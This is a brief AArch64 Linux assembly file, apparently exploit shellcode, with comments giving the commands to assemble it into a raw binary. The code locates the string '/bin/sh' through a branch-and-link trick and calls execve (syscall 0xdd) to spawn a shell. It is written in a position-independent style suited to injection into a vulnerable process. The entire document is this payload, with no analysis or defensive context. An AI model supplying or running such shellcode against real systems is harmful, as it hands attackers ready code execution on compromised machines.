/* aarch64-linux-gnu-as -o temp.o sc.s */
/* aarch64-linux-gnu-objcopy -O binary temp.o sc.o */

.global _start
_start:
    b binsh
back:
    mov x0, x30
    mov x1, xzr
    mov x2, xzr
    mov x8, #0xdd
    svc #1
binsh:
    bl back
    .ascii "/bin/sh"
